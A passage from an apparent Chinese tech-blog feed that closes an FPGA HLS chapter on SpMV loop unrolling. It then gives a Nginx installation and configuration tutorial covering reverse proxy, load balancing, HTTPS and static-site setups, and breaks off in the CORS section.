class="number">1</span>]) &#123;</span><br><span class="line">                  yt += values[k+j] * x[columnIndex[k+j]];</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          y0 += yt;</span><br><span class="line">      &#125;</span><br><span class="line">    y[i] = y0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.6  局部展开图6.2中**smpv**函数">图6.6 局部展开图6.2中<strong>smpv</strong>函数</p><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/spmv_partial_unroll.jpg" alt="图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加">图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加</p><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/spmv_unrolled_behavior.jpg" alt="图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程">图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程</p><p>如果矩阵每行非零元素很少，则采用第一种实现方式较优；如果矩阵中每行非零元素较多，则第二种实现方式更好。</p><p>需要注意，这里存在一个关于先有鸡还是先有蛋的问题。我们需要知道目标器件和时钟周期，这样才能确定流水线中加法器能不能满足时序要求。只有在我们知道流水线的级数之后（也许S=1时，Vivado HLS才能识别到加法递归），我们才能选择合适版本的参数S，来满足II=1<em>I**I</em>=1。一旦我们确定了<strong>S</strong>，我们能通过<strong>C/RTL</strong>协同仿真来，通过一组测试数据，确定是不是达到了性能上的要求。因为循环边界是可变的，所以得到的性能参数是依赖于数据的，所以我们需要设定不同的<strong>S</strong>，来找到性能的最大值。改变器件的类型和工作频率会影响之前所有的设计！尽管看来去高层次综合（<strong>HLS</strong>）对解决问题提供的帮助不多，相比于RTL开发新版本然后进行验证，它开发起来快（代码编写方便）。</p><p>图6.8可以实现时，<strong>S</strong> 与加法器流水线等级相同。如果<strong>S</strong>设定较大，结果会怎样？如果<strong>S</strong> 设定较小，结果会怎样？如果目标<strong>II</strong>小于<strong>S</strong>会怎样？如果目标<strong>II</strong>大于<strong>S</strong>会怎样？</p><h3 id="6-7小结"><a href="#6-7小结" class="headerlink" title="6.7小结"></a>6.7小结</h3><p>在本章节中，我们介绍了系数矩阵向量乘法（SpMV），这延续了之前对矩阵运算的研究。SpMV 显得很有趣，因为它采用了一种特别的数据结构。为了减少大量的存储，矩阵采用行压缩的方式存储，这样就要求我们以一种非直接的方式对矩阵进行访问。</p><p>这一章节首先我们了<strong>Vivado®HLS</strong>工具测试和仿真的能力。我们采用一个基于SpMV简单的激励文件，讲解HLS工作流程。另外，我们对<strong>Vivado®HLS</strong>工具中<strong>C/RTL</strong> 协同仿真进行了讲解。这对我们得到设计准确性能结果是十分重要。矩阵越不稀疏，则更多的计算需要执行。在测试平台确定以后，协同仿真可以提供程序运行的精确仿真。这样就可以达到执行周期和性能结果。最后，我们讨论了采用循环优化和数组分块对代码进行优化。</p><blockquote><p><a href="https://xupsh.github.io/pp4fpgas-cn/" target="_blank" rel="noopener">fpga并行编程</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SpMV </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpMV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx</title>
      <link href="/2019/05/19/Nginx/"/>
      <url>/2019/05/19/Nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx安装及配置"><a href="#Nginx安装及配置" class="headerlink" title="Nginx安装及配置"></a>Nginx安装及配置</h1><blockquote><p>本文参考：</p><p><a href="https://www.runoob.com/linux/nginx-install-setup.html" target="_blank" rel="noopener">Nginx安装配置_菜鸟教程</a></p><p><a href="http://www.nginx.cn/doc/" target="_blank" rel="noopener">Nginx中文文档</a></p><p><a href="https://www.cnblogs.com/jingmoxukong/p/5945200.html" target="_blank" rel="noopener">Nginx简易教程</a></p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>什么是nginx?</strong></p><p>Nginx (engine x) 是一款轻量级的Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。</p><p><strong>什么是反向代理？</strong></p><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p><img src="https://pic2.zhimg.com/80/v2-ed1a226ae675b102b6eb7394b6db9235_hd.jpg" alt="img"></p><h2 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a><strong>安装与使用</strong></h2><p><strong>安装</strong></p><p>nginx官网下载地址：<a href="https://link.zhihu.com/?target=http%3A//nginx.org" target="_blank" rel="noopener">http://nginx.org</a>，发布版本分为 Linux 和 windows 版本。</p><p>也可以下载源码，编译后运行。</p><p><strong>从源代码编译 Nginx</strong></p><p>把源码解压缩之后，在终端里运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>默认情况下，Nginx 会被安装在 /usr/local/nginx。通过设定编译选项，你可以改变这个设定。</p><p><strong>Windows 安装</strong></p><p>为了安装 Nginx / Win32，需先下载它(<a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">Nginx官方下载</a>)。然后解压之，然后运行即可。下面以 C 盘根目录为例说明下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx-0.8.54   start nginx</span><br></pre></td></tr></table></figure><p>Nginx / Win32 是运行在一个控制台程序，而非 windows 服务方式的。服务器方式目前还是开发尝试中。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a><strong>使用</strong></h3><p>nginx 的使用比较简单，就是几条命令。</p><p><strong>常用到的命令如下：</strong></p><ul><li><strong>nginx -s stop ：</strong>快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。</li><li><strong>nginx -s quit ：</strong>平稳关闭Nginx，保存相关信息，有安排的结束web服务。</li><li><strong>nginx -s reload ：</strong>因改变了Nginx相关配置，需要重新加载配置而重载。</li><li><strong>nginx -s reopen ：</strong>重新打开日志文件。</li><li><strong>nginx -c filename ：</strong>为 Nginx 指定一个配置文件，来代替缺省的。</li><li><strong>nginx -t ：</strong>不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。</li><li><strong>nginx -v：</strong>显示 nginx 的版本。</li><li><strong>nginx -V：</strong>显示 nginx 的版本，编译器版本和配置参数。</li></ul><p>如果不想每次都敲命令，可以在nginx安装目录下新添一个启动批处理文件startup.bat，双击即可运行。内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程</span><br><span class="line">nginx.exe -s stop</span><br><span class="line"></span><br><span class="line">rem 测试配置文件语法正确性</span><br><span class="line">nginx.exe -t -c conf/nginx.conf</span><br><span class="line"></span><br><span class="line">rem 显示版本信息</span><br><span class="line">nginx.exe -v</span><br><span class="line"></span><br><span class="line">rem 按照指定配置去启动nginx</span><br><span class="line">nginx.exe -c conf/nginx.conf</span><br></pre></td></tr></table></figure><p>如果是运行在 Linux 下，写一个 shell 脚本，大同小异。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="nginx-配置实战"><a href="#nginx-配置实战" class="headerlink" title="nginx 配置实战"></a><strong>nginx 配置实战</strong></h3><p>我始终认为，各种开发工具的配置还是结合实战来讲述，会让人更易理解。</p><h3 id="http反向代理配置"><a href="#http反向代理配置" class="headerlink" title="http反向代理配置"></a><strong>http反向代理配置</strong></h3><p>我们先实现一个小目标：不考虑复杂的配置，仅仅是完成一个 http 反向代理。</p><h3 id="nginx-conf-配置文件如下："><a href="#nginx-conf-配置文件如下：" class="headerlink" title="nginx.conf 配置文件如下："></a><strong>nginx.conf 配置文件如下：</strong></h3><p>注：conf / nginx.conf 是 nginx 的默认配置文件。你也可以使用 nginx -c 指定你的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#运行用户</span><br><span class="line">#user somebody;</span><br><span class="line"></span><br><span class="line">#启动进程,通常设置成和cpu的数量相等</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#全局错误日志</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/error.log;</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/notice.log  notice;</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/info.log  info;</span><br><span class="line"></span><br><span class="line">#PID文件，记录当前启动的nginx的进程ID</span><br><span class="line">pid        D:/Tools/nginx-1.10.1/logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">#工作模式及连接数上限</span><br><span class="line">events &#123;</span><br><span class="line">   worker_connections 1024;    #单个后台worker process进程的最大并发链接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span><br><span class="line">http &#123;</span><br><span class="line">   #设定mime类型(邮件支持类型),类型由mime.types文件定义</span><br><span class="line">   include       D:/Tools/nginx-1.10.1/conf/mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   </span><br><span class="line">   #设定日志</span><br><span class="line">   log_format  main  &apos;[$remote_addr] - [$remote_user] [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">                     </span><br><span class="line">   access_log    D:/Tools/nginx-1.10.1/logs/access.log main;</span><br><span class="line">   rewrite_log     on;</span><br><span class="line">   </span><br><span class="line">   #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用，</span><br><span class="line">   #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime.</span><br><span class="line">   sendfile        on;</span><br><span class="line">   #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">   #连接超时时间</span><br><span class="line">   keepalive_timeout  120;</span><br><span class="line">   tcp_nodelay        on;</span><br><span class="line">   </span><br><span class="line">   #gzip压缩开关</span><br><span class="line">   #gzip  on;</span><br><span class="line"></span><br><span class="line">   #设定实际的服务器列表 </span><br><span class="line">   upstream zp_server1&#123;</span><br><span class="line">       server 127.0.0.1:8089;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   #HTTP服务器</span><br><span class="line">   server &#123;</span><br><span class="line">       #监听80端口，80端口是知名端口号，用于HTTP协议</span><br><span class="line">       listen       80;</span><br><span class="line">       </span><br><span class="line">       #定义使用www.xx.com访问</span><br><span class="line">       server_name  www.helloworld.com;</span><br><span class="line">       </span><br><span class="line">       #首页</span><br><span class="line">       index index.html</span><br><span class="line">       </span><br><span class="line">       #指向webapp的目录</span><br><span class="line">       root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp;</span><br><span class="line">       </span><br><span class="line">       #编码格式</span><br><span class="line">       charset utf-8;</span><br><span class="line">       </span><br><span class="line">       #代理配置参数</span><br><span class="line">       proxy_connect_timeout 180;</span><br><span class="line">       proxy_send_timeout 180;</span><br><span class="line">       proxy_read_timeout 180;</span><br><span class="line">       proxy_set_header Host $host;</span><br><span class="line">       proxy_set_header X-Forwarder-For $remote_addr;</span><br><span class="line"></span><br><span class="line">       #反向代理的路径（和upstream绑定），location 后面设置映射的路径</span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://zp_server1;</span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       #静态文件，nginx自己处理</span><br><span class="line">       location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123;</span><br><span class="line">           root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews;</span><br><span class="line">           #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。</span><br><span class="line">           expires 30d;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       #设定查看Nginx状态的地址</span><br><span class="line">       location /NginxStatus &#123;</span><br><span class="line">           stub_status           on;</span><br><span class="line">           access_log            on;</span><br><span class="line">           auth_basic            &quot;NginxStatus&quot;;</span><br><span class="line">           auth_basic_user_file  conf/htpasswd;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       #禁止访问 .htxxx 文件</span><br><span class="line">       location ~ /.ht &#123;</span><br><span class="line">           deny all;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       #错误处理页面（可选择性配置）</span><br><span class="line">       #error_page   404              /404.html;</span><br><span class="line">       #error_page   500 502 503 504  /50x.html;</span><br><span class="line">       #location = /50x.html &#123;</span><br><span class="line">       #    root   html;</span><br><span class="line">       #&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，让我们来试试吧：</p><ol><li>启动 webapp，注意启动绑定的端口要和nginx中的 upstream 设置的端口保持一致。</li><li>更改 host：在 C:WindowsSystem32driversetc 目录下的host文件中添加一条DNS 记录127.0.0.1 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a></li><li>启动前文中 startup.bat 的命令</li><li>在浏览器中访问 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a>，不出意外，已经可以访问了。</li></ol><h3 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a><strong>负载均衡配置</strong></h3><p>上一个例子中，代理仅仅指向一个服务器。</p><p>但是，网站在实际运营过程中，多半都是有多台服务器运行着同样的app，这时需要使用负载均衡来分流。</p><p>nginx也可以实现简单的负载均衡功能。</p><p>假设这样一个应用场景：将应用部署在 192.168.1.11:80、192.168.1.12:80、192.168.1.13:80 三台linux环境的服务器上。网站域名叫 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a>，公网IP为 192.168.1.11。在公网IP所在的服务器上部署 nginx，对所有请求做负载均衡处理。</p><p>nginx.conf 配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    #设定mime类型,类型由mime.type文件定义</span><br><span class="line">   include       /etc/nginx/mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   #设定日志格式</span><br><span class="line">   access_log    /var/log/nginx/access.log;</span><br><span class="line"></span><br><span class="line">   #设定负载均衡的服务器列表</span><br><span class="line">   upstream load_balance_server &#123;</span><br><span class="line">       #weigth参数表示权值，权值越高被分配到的几率越大</span><br><span class="line">       server 192.168.1.11:80   weight=5;</span><br><span class="line">       server 192.168.1.12:80   weight=1;</span><br><span class="line">       server 192.168.1.13:80   weight=6;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  #HTTP服务器</span><br><span class="line">  server &#123;</span><br><span class="line">       #侦听80端口</span><br><span class="line">       listen       80;</span><br><span class="line">       </span><br><span class="line">       #定义使用www.xx.com访问</span><br><span class="line">       server_name  www.helloworld.com;</span><br><span class="line"></span><br><span class="line">       #对所有请求进行负载均衡请求</span><br><span class="line">       location / &#123;</span><br><span class="line">           root        /root;                 #定义服务器的默认网站根目录位置</span><br><span class="line">           index       index.html index.htm;  #定义首页索引文件的名称</span><br><span class="line">           proxy_pass  http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表</span><br><span class="line"></span><br><span class="line">           #以下是一些反向代理的配置(可选择性配置)</span><br><span class="line">           #proxy_redirect off;</span><br><span class="line">           proxy_set_header Host $host;</span><br><span class="line">           proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">           #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span><br><span class="line">           proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">           proxy_connect_timeout 90;          #nginx跟后端服务器连接超时时间(代理连接超时)</span><br><span class="line">           proxy_send_timeout 90;             #后端服务器数据回传时间(代理发送超时)</span><br><span class="line">           proxy_read_timeout 90;             #连接成功后，后端服务器响应时间(代理接收超时)</span><br><span class="line">           proxy_buffer_size 4k;              #设置代理服务器（nginx）保存用户头信息的缓冲区大小</span><br><span class="line">           proxy_buffers 4 32k;               #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置</span><br><span class="line">           proxy_busy_buffers_size 64k;       #高负荷下缓冲大小（proxy_buffers*2）</span><br><span class="line">           proxy_temp_file_write_size 64k;    #设定缓存文件夹大小，大于这个值，将从upstream服务器传</span><br><span class="line">           </span><br><span class="line">           client_max_body_size 10m;          #允许客户端请求的最大单文件字节数</span><br><span class="line">           client_body_buffer_size 128k;      #缓冲区代理缓冲用户端请求的最大字节数</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="网站有多个webapp的配置"><a href="#网站有多个webapp的配置" class="headerlink" title="网站有多个webapp的配置"></a><strong>网站有多个webapp的配置</strong></h3><p>当一个网站功能越来越丰富时，往往需要将一些功能相对独立的模块剥离出来，独立维护。这样的话，通常，会有多个 webapp。</p><p>举个例子：假如 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 站点有好几个webapp，finance（金融）、product（产品）、admin（用户中心）。访问这些应用的方式通过上下文(context)来进行区分:</p><ul><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/finance/" target="_blank" rel="noopener">http://www.helloworld.com/finance/</a></li><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/product/" target="_blank" rel="noopener">http://www.helloworld.com/product/</a></li><li><a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com/admin/" target="_blank" rel="noopener">http://www.helloworld.com/admin/</a></li></ul><p>我们知道，http的默认端口号是80，如果在一台服务器上同时启动这3个 webapp 应用，都用80端口，肯定是不成的。所以，这三个应用需要分别绑定不同的端口号。</p><p>那么，问题来了，用户在实际访问 <a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 站点时，访问不同 webapp，总不会还带着对应的端口号去访问吧。所以，你再次需要用到反向代理来做处理。</p><p>配置也不难，来看看怎么做吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   #此处省略一些基本配置</span><br><span class="line">   </span><br><span class="line">   upstream product_server&#123;</span><br><span class="line">       server www.helloworld.com:8081;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   upstream admin_server&#123;</span><br><span class="line">       server www.helloworld.com:8082;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   upstream finance_server&#123;</span><br><span class="line">       server www.helloworld.com:8083;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line">       #此处省略一些基本配置</span><br><span class="line">       #默认指向product的server</span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://product_server;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location /product/&#123;</span><br><span class="line">           proxy_pass http://product_server;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location /admin/ &#123;</span><br><span class="line">           proxy_pass http://admin_server;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       location /finance/ &#123;</span><br><span class="line">           proxy_pass http://finance_server;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="https反向代理配置"><a href="#https反向代理配置" class="headerlink" title="https反向代理配置"></a><strong>https反向代理配置</strong></h3><p>一些对安全性要求比较高的站点，可能会使用 HTTPS（一种使用ssl通信标准的安全HTTP协议）。</p><p>这里不科普 HTTP 协议和 SSL 标准。但是，使用 nginx 配置 https 需要知道几点：</p><ul><li>HTTPS 的固定端口号是 443，不同于 HTTP 的 80 端口</li><li>SSL 标准需要引入安全证书，所以在 nginx.conf 中你需要指定证书和它对应的 key</li></ul><p>其他和 http 反向代理基本一样，只是在 Server 部分配置有些不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#HTTP服务器</span><br><span class="line"> server &#123;</span><br><span class="line">     #监听443端口。443为知名端口号，主要用于HTTPS协议</span><br><span class="line">     listen       443 ssl;</span><br><span class="line"></span><br><span class="line">     #定义使用www.xx.com访问</span><br><span class="line">     server_name  www.helloworld.com;</span><br><span class="line"></span><br><span class="line">     #ssl证书文件位置(常见证书文件格式为：crt/pem)</span><br><span class="line">     ssl_certificate      cert.pem;</span><br><span class="line">     #ssl证书key位置</span><br><span class="line">     ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">     #ssl配置参数（选择性配置）</span><br><span class="line">     ssl_session_cache    shared:SSL:1m;</span><br><span class="line">     ssl_session_timeout  5m;</span><br><span class="line">     #数字签名，此处使用MD5</span><br><span class="line">     ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">     ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">     location / &#123;</span><br><span class="line">         root   /root;</span><br><span class="line">         index  index.html index.htm;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="静态站点配置"><a href="#静态站点配置" class="headerlink" title="静态站点配置"></a><strong>静态站点配置</strong></h3><p>有时候，我们需要配置静态站点(即 html 文件和一堆静态资源)。</p><p>举例来说：如果所有的静态资源都放在了 /app/dist 目录下，我们只需要在 nginx.conf 中指定首页以及这个站点的 host 即可。</p><p>配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">   worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">   include       mime.types;</span><br><span class="line">   default_type  application/octet-stream;</span><br><span class="line">   sendfile        on;</span><br><span class="line">   keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">   gzip on;</span><br><span class="line">   gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png;</span><br><span class="line">   gzip_vary on;</span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  static.zp.cn;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           root /app/dist;</span><br><span class="line">           index index.html;</span><br><span class="line">           #转发任何请求到 index.html</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，添加 HOST：127.0.0.1 <a href="https://link.zhihu.com/?target=http%3A//static.zp.cn" target="_blank" rel="noopener">http://static.zp.cn</a>，此时，在本地浏览器访问 <a href="https://link.zhihu.com/?target=http%3A//static.zp.cn" target="_blank" rel="noopener">http://static.zp.cn</a> ，就可以访问静态站点了。</p><h3 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a><strong>跨域解决方案</strong></h3><p>web 领域开发中，经常采用前后端分离模式。这种模式下，前端和后端分别是独立的 web 应用程序，例如：后端是 Java 程序，前端是 React 或 Vue 应用。</p><p>各自独立的 web app 在互相访问时，势必存在跨域问题。解决跨域问题一般有两种思路：</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a><strong>CORS</strong></h3><p>在后端服务器设置 HTTP 响应头，把你需要运行访问的域名加入加入 